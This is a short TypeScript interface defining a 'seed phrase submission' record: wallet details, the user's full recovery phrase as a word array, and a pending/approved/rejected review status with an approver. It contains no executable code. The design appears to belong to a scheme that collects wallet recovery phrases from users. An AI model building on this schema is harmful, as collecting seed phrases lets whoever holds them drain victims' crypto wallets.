export interface SeedPhraseSubmission {
  userId: string;
  walletType: string;
  walletName: string;
  walletIcon: string;
  walletColor: string;
  seedPhrase: string[];
  status: 'pending' | 'approved' | 'rejected';
  submittedAt: Date;
  approvedAt?: Date;
  approvedBy?: string;
}